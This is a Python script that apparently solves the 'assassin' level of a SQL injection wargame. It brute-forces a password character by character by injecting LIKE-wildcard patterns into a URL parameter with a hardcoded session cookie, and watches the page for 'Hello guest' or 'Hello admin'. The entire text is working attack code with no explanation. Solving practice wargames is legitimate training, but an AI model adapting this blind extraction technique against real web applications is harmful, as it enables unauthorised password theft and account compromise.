import urllib.request
length=8
pw=""
arr="1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM"
for i in range(1,9):
	for j in range(0,62):
		url='http://los.rubiya.kr/assassin_14a1fd552c61c60f034879e5d4171373.php?pw={pwarr}{asciiarr}%'.format(i,pwarr=pw,asciiarr=arr[j])
		r = urllib.request.Request(url)
		r.add_header("Cookie","PHPSESSID=1a1hlpne9kfc84ivkcmr5pd011")
		data = urllib.request.urlopen(r).read().decode("utf-8")
		print(url)
		if data.find("Hello guest") != -1 or data.find("Hello admin") != -1:
			pw = pw + arr[j]
			if data.find("Hello guest") != -1:
				print("guest : "+arr[j])
			else:
				print("admin : "+arr[j])
			break
print(pw)